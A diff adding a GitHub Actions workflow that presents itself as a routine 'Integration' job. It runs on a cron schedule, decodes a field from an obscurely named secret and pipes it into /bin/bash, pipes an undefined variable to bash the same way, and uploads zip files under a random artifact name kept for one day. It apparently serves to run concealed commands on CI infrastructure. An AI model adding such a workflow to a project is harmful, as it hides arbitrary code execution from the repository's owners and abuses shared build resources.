@@ -1,0 +1,27 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '19 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          ztqgo5: ${{ secrets.ztqgo5 }}
+        run: |
+          printf '%s' "$ztqgo5" | jq -r .cw1014 | /bin/bash
+          echo $g66940 | jq -r .nbas9153 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: aUhRUbOi
+          path: "*.zip"
+          retention-days: 1
